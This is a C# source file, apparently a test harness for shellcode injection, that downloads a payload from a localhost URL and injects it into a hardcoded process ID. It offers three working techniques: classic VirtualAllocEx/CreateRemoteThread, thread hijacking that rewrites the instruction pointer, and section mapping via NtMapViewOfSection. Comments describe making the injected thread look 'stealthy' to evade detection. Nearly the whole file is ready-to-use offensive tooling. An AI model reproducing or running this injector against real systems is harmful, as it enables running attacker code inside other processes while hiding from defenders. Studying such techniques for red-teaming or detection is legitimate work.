using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static CLRInjection.Enums;
using static CLRInjection.DllImports;

namespace ShellcodeTest
{
    public class Program
    {

        static int pid = Process.GetCurrentProcess().Id;

        static void Main(string[] args)
        {
            pid = 12280;
            Process proc = Process.GetProcessById(pid);

            byte[] shellcode = new System.Net.WebClient().DownloadData("http://localhost/shellcode");

            IntPtr hProcess = GetProcessHandle(pid);
            
            if (hProcess == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                if (error == 5)
                {
                    Console.WriteLine("OpenProcess Failed - Access Denied");
                }
                else
                {
                    Console.WriteLine($"OpenProcess failed - {error} ");
                }
            }
            else
            {
                if (args[0] == "NtMapViewOfSection")
                {
                    ShellcodeInjectNtMapViewOfSection(shellcode, hProcess);
                }
                else if (args[0] == "VirtualAlloc")
                {
                    ShellcodeInjectClassic(shellcode, hProcess);
                }
                else if (args[0].ToLower() == "threadhijack")
                {
                    // 64-bit only - add checks
                    ShellcodeInjectThreadHijack(shellcode, hProcess);
                }
            }
     
        }

        /// <summary>
        /// Injects shellcode into a remote process via VirtualAlloc, WriteProcessMemory, CreateRemoteThread
        /// </summary>
        /// <param name="shellcode">Shellcode to be injected</param>
        /// <param name="processId">PID of the target process</param>
        /// <returns></returns>
        public static int ShellcodeInjectClassic(byte[] shellcode, IntPtr hProcess)
        {
            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocMemAddress == IntPtr.Zero)
            {
                Console.WriteLine("Failed");
            }

            UIntPtr bytesWritten;
            WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
            if ((int)bytesWritten != shellcode.Length)
            {

            }

            CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);

            return 0;
        }

        // Copy Shellcode to target, Create new suspended thread, update RIP to point to shellcode then resume thread
        // Only works for 64bit processes atm 
        /// <summary>
        /// Execute shellcode "stealthily" in a remote process by ensuring the newly-created thread has type MEM_IMAGE. This function only works between processes with the same architecture
        /// </summary>
        /// <param name="shellcode"></param>
        /// <param name="procPID"></param>
        /// <returns></returns>
        public static int ShellcodeInjectThreadHijack(byte[] shellcode, IntPtr hProcess)
        {
          

            string arch;
            bool isTargetWow64;
            IsWow64Process(hProcess, out isTargetWow64);
 
            if (!isTargetWow64 && IntPtr.Size == 8)
            {
                // Both processes are 64bit
                arch = "x64";
            }
            else if (isTargetWow64 && IntPtr.Size == 4)
            {
                // Both processes are 32bit
                arch = "x86";
            }
            else
            {             
                Console.WriteLine("Error - Current and target process are not same architecture\nThis technique only works x86 -> x86 or x64 -> x64");
                return 1;
            }

            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Load kernel32.dll and get pointer to the base address of the LoadLibraryA function
            IntPtr fLoadLibrary = GetProcAddress(LoadLibrary("kernel32.dll"), "LoadLibraryA");
            if (fLoadLibrary == IntPtr.Zero)
            {
                Console.WriteLine($"LoadLibrary failed - {Marshal.GetLastWin32Error()}");
            }

            UIntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten))
            {
                Console.WriteLine($"WriteProcessMemory failed - {Marshal.GetLastWin32Error()}");
                return 1;
            }

            // Use LoadLibraryA as entrypoint so that memory type is MEM_IMAGE
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, fLoadLibrary, IntPtr.Zero, CREATE_SUSPENDED, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine($"CreateRemoteThread failed - {Marshal.GetLastWin32Error()}");
                return 1;
            }

            // Check whether both processes are 32/64bit
            if (arch == "x64")
            {
                // Get the current registers for the suspended thread
                CONTEXT64 context = new CONTEXT64();
                context.ContextFlags = CONTEXT_FLAGS.CONTEXT_CONTROL;
                GetThreadContext(hThread, ref context);

                // Update the RIP register to contain the address of the start of the shellcode
                context.Rip = (ulong)allocMemAddress.ToInt64();

                // Update the suspended thread's registers with the changed RIP address then execute the thread
                SetThreadContext(hThread, ref context);
                ResumeThread(hThread);
            }
            else if (arch == "x86")
            {
                // Get the current registers for the suspended thread
                CONTEXT context = new CONTEXT();
                context.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_CONTROL;
                GetThreadContext(hThread, ref context);

                // Update the RIP register to contain the address of the start of the shellcode
                context.Eip = (uint)allocMemAddress.ToInt32();

                // Update the suspended thread's registers with the changed RIP address then execute the thread
                SetThreadContext(hThread, ref context);
                ResumeThread(hThread);
            }
            return 0;
        }

        public static int ShellcodeInjectNtMapViewOfSection(byte[] shellcode, IntPtr hProcess)
        { 

            IntPtr sectionHandle = IntPtr.Zero;
            UInt32 sectionSize = 61440;

            // Create a new memory section under the current process
            NtCreateSection(ref sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                IntPtr.Zero, ref sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);

            IntPtr localSectionAddress = IntPtr.Zero;
            uint viewSize = 0;
            ulong sectionOffset = 0;
            NtMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, ref localSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out viewSize, 2, 0, PAGE_READWRITE);


            // Create a view of the memory section in the target process
            IntPtr remoteSectionAddress = IntPtr.Zero;
            NtMapViewOfSection(sectionHandle, hProcess, ref remoteSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out viewSize, 2, 0, PAGE_EXECUTE_READ);

            // Copy shellcode into the newly mapped section of memory
            Marshal.Copy(shellcode, 0, localSectionAddress, shellcode.Length);

            // Execute the shellcode
            IntPtr targetThreadHandle = IntPtr.Zero;
            RtlCreateUserThread(hProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, remoteSectionAddress, IntPtr.Zero, ref targetThreadHandle, IntPtr.Zero);

            return 0;
        }

        /// <summary>
        /// Checks whether the process is running under WOW64.
        /// </summary>
        /// <returns>Returns true if process is running under WOW64, otherwise returns False.</returns>
        public static bool IsWow64(IntPtr hProcess)
        {
            bool retVal = false;
            IsWow64Process(hProcess, out retVal);
            return retVal;
        }

        public static IntPtr GetProcessHandle(int processId)
        {
            Process targetProcess = Process.GetProcessById(processId);

            return OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
        }
    }
}